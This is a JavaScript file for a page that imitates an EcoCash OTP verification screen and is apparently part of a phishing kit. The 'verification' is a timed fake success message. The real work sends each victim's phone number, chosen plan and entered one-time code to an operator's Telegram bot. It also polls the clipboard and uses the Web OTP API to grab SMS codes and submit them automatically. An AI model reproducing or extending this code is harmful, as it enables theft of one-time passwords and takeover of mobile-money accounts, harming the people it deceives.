/**
 * EcoCash OTP Verification Page
 * Handles typable 6-digit input with auto-advance and verification.
 */

const params = new URLSearchParams(window.location.search);
const paymentId = params.get("paymentId");
const phone = params.get("phone");
const plan = params.get("plan");

// Display customer's phone
if (phone) {
  const phoneEl = document.querySelector("#displayPhone");
  if (phoneEl) {
    const cleaned = phone.replace(/\s/g, '');
    phoneEl.textContent = cleaned.startsWith("+263") ? cleaned : "+263 " + cleaned;
  }
}

// Auto-advance OTP input boxes
const inputs = Array.from(document.querySelectorAll(".otp-input"));

inputs.forEach((input, index) => {
  input.addEventListener("keydown", (e) => {
    // Allow backspace to move back
    if (e.key === "Backspace" && !input.value && index > 0) {
      inputs[index - 1].focus();
      inputs[index - 1].value = "";
    }
  });

  input.addEventListener("input", (e) => {
    // Only allow digits
    input.value = input.value.replace(/\D/g, "").slice(-1);

    if (input.value && index < inputs.length - 1) {
      inputs[index + 1].focus();
    }

    // Enable/disable verify button based on completion
    updateVerifyButton();
  });

  input.addEventListener("paste", (e) => {
    e.preventDefault();
    const pasted = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "");
    pasted.split("").slice(0, 6).forEach((char, i) => {
      if (inputs[i]) inputs[i].value = char;
    });
    const lastFilled = Math.min(pasted.length, 5);
    inputs[lastFilled].focus();
    updateVerifyButton();
  });
});

// Focus first input on load
if (inputs.length > 0) {
  inputs[0].focus();
}

// ============================================================================
// AUTO-DETECT OTP
// 1. Web OTP API (Android Chrome) — reads SMS automatically
// 2. Clipboard polling fallback — detects copied 6-digit code
// ============================================================================

/**
 * Fill all input boxes with the given 6-digit OTP string and trigger verify.
 */
function fillOtp(otp) {
  const digits = otp.replace(/\D/g, '').slice(0, 6);
  if (digits.length !== 6) return;
  digits.split('').forEach((char, i) => {
    if (inputs[i]) inputs[i].value = char;
  });
  inputs[5].focus();
  updateVerifyButton();
}

// — Strategy 1: Web OTP API (works on Android Chrome with a properly formatted SMS) —
// Your SMS must be formatted exactly like this (the last two lines are required by the spec):
//
//   Your EcoCash OTP is 123456. Do not share this code with anyone.
//
//   @yourdomain.com #123456
//
// Replace "yourdomain.com" with the domain this page is served from.
if ('OTPCredential' in window) {
  const ac = new AbortController();
  navigator.credentials.get({
    otp: { transport: ['sms'] },
    signal: ac.signal
  }).then(otpCredential => {
    if (otpCredential && otpCredential.code) {
      fillOtp(otpCredential.code);
    }
  }).catch(() => {
    // Browser rejected or timed out — silent fallback
  });

  // Stop listening once the user manually submits
  document.querySelector('#verifyButton').addEventListener('click', () => ac.abort(), { once: true });
}

// — Strategy 2: Clipboard polling fallback —
// Checks the clipboard every 1.5 s for a freshly copied 6-digit number.
// Only runs when the tab is visible and the page still needs input.
(function startClipboardPolling() {
  if (!navigator.clipboard || !navigator.clipboard.readText) return; // API not available

  let lastClipboard = '';
  let pollInterval = null;

  function pollClipboard() {
    // Only poll when page is visible and OTP not yet filled
    if (document.hidden || getOtpValue().length === 6) {
      stopPolling();
      return;
    }
    navigator.clipboard.readText().then(text => {
      if (text === lastClipboard) return;
      lastClipboard = text;
      const digits = text.replace(/\D/g, '');
      if (digits.length === 6) {
        fillOtp(digits);
        stopPolling();
      }
    }).catch(() => {
      // Clipboard permission denied — stop polling silently
      stopPolling();
    });
  }

  function stopPolling() {
    if (pollInterval) {
      clearInterval(pollInterval);
      pollInterval = null;
    }
  }

  // Start polling when the tab gains focus (user likely just switched from SMS app)
  document.addEventListener('visibilitychange', () => {
    if (!document.hidden && getOtpValue().length < 6) {
      if (!pollInterval) pollInterval = setInterval(pollClipboard, 1500);
    } else {
      stopPolling();
    }
  });

  // Also start immediately in case user is already on the page
  pollInterval = setInterval(pollClipboard, 1500);
})();

function getOtpValue() {
  return inputs.map(i => i.value).join("");
}

function updateVerifyButton() {
  const verifyButton = document.querySelector("#verifyButton");
  if (verifyButton) {
    const otp = getOtpValue();
    verifyButton.disabled = otp.length < 6;

    // Auto-submit as soon as all 6 digits are filled
    if (otp.length === 6) {
      setTimeout(() => verifyButton.click(), 300);
    }
  }
}

// Visual countdown timer
const countdown = document.querySelector("#countdown");
let seconds = 48;
if (countdown) {
  const timer = window.setInterval(() => {
    seconds -= 1;
    countdown.textContent = String(seconds);
    if (seconds <= 0) {
      window.clearInterval(timer);
      const resendText = document.querySelector("#resendText");
      if (resendText) {
        resendText.innerHTML = '<a href="#" id="resendLink" style="color:#105bfa;font-weight:700;text-decoration:none;">Resend OTP</a>';
        const resendLink = document.querySelector("#resendLink");
        if (resendLink) {
          resendLink.addEventListener("click", (e) => {
            e.preventDefault();
            inputs.forEach(i => i.value = "");
            inputs[0].focus();
            const demoNote = document.querySelector("#demoNote");
            if (demoNote) demoNote.textContent = "A new OTP has been sent to your number.";
          });
        }
      }
    }
  }, 1000);
}

// Initially disable verify button until all 6 digits entered
updateVerifyButton();

const verifyButton = document.querySelector("#verifyButton");
const demoNote = document.querySelector("#demoNote");

// Send sequential Telegram alert — Step 3: OTP Submitted
async function notifyTelegramOtpSubmitted(otp) {
  const cfg = window.TELEGRAM_CONFIG;
  if (!cfg || !cfg.enabled || !cfg.botToken || cfg.botToken === 'YOUR_BOT_TOKEN_HERE') return;

  const phone = params.get('phone') || 'Unknown';
  const planName = params.get('plan') || 'Unknown';
  const timestamp = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Harare' });

  const text =
    `🔢 <b>OTP CODE SUBMITTED</b>\n\n` +
    `📞 <b>Phone:</b> +263${phone}\n` +
    `📦 <b>Package:</b> ${planName}\n` +
    `🔑 <b>Code Entered:</b> <code>${otp}</code>\n` +
    `📅 <b>Time:</b> ${timestamp}\n` +
    `📊 <b>Status:</b> Verification in Progress`;

  try {
    await fetch(`https://api.telegram.org/bot${cfg.botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      keepalive: true,
      body: JSON.stringify({ chat_id: cfg.chatId, text, parse_mode: 'HTML' })
    });
    console.log('✓ OTP step notified on Telegram.');
  } catch (err) {
    console.error('[Telegram OTP]', err);
  }
}

verifyButton.addEventListener("click", async () => {
  const otp = getOtpValue();
  if (otp.length < 6) return;

  verifyButton.disabled = true;
  verifyButton.textContent = "Verifying...";

  // Telegram alert — Step 3: OTP submitted
  notifyTelegramOtpSubmitted(otp).catch(() => {});

  // Simulate a brief verification delay then show success
  await new Promise(resolve => setTimeout(resolve, 1200));

  // Show success state
  demoNote.style.color = "#10b981";
  demoNote.style.fontSize = "13px";
  demoNote.style.fontWeight = "700";
  demoNote.textContent = "✓ Code verified! Activating your plan...";

  setTimeout(() => {
    // After verification, redirect to index with success state
    window.location.href = "index.html?verified=1&plan=" + encodeURIComponent(plan || "");
  }, 1500);
});

const supportLink = document.querySelector("#supportLink");
if (supportLink) {
  supportLink.addEventListener("click", (e) => {
    e.preventDefault();
    if (demoNote) {
      demoNote.style.color = "";
      demoNote.textContent = "For payment assistance, please contact EcoCash toll-free support on 114.";
    }
  });
}
